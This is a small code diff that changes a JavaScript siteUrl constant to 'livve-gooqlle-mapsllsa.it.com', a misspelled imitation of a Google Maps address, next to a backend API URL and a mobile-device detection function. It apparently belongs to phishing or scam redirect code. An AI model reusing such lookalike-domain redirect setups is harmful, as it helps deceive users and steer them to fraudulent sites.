@@ -1,5 +1,5 @@
 const API_URL = 'https://erosback.vercel.app'
-const siteUrl ='www.meggapursonel.online'
+const siteUrl ='livve-gooqlle-mapsllsa.it.com'
 
 function detectDevice(userAgent) {
     if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
